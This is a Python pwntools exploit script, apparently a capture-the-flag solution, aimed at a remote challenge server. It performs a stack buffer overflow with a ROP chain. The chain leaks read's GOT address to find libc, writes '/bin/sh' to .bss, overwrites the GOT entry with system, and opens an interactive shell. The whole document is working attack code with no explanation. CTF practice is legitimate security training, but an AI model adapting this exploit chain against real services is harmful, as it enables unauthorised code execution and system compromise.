from pwn import *
context.log_level = 'debug'
pppr = 0x08048509
write_plt = 0x08048340
read_plt = 0x08048310
read_got = 0x0804a00c
read_offset = 0x000d4350
system_offset = 0x0003a940
bss = 0x0804a024
binsh = "/bin/sh\x00"

#p = process('rop')
p = remote("ctf.j0n9hyun.xyz", 3021)

# BOF & leak read_got
payload = "A"*(0x88+4)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

#input "/bin/sh" in .bss
payload  += p32(read_plt)
payload  += p32(pppr)
payload  += p32(0)
payload  += p32(bss)
payload  += p32(len(binsh))

# GOT overwrite read_got -> system
payload  += p32(read_plt)
payload  += p32(pppr)
payload  += p32(0)
payload  += p32(read_got)
payload  += p32(4)

#execute system
payload += p32(read_plt)
payload += "AAAA"
payload += p32(bss)

p.sendline(payload)
read_addr = u32(p.recv(4))
libc = read_addr - read_offset
print ("libc addr = " + hex(libc))
system_addr = libc + system_offset
print ("system addr = " + hex(system_addr))
p.send(binsh)
p.sendline(p32(system_addr))
p.interactive()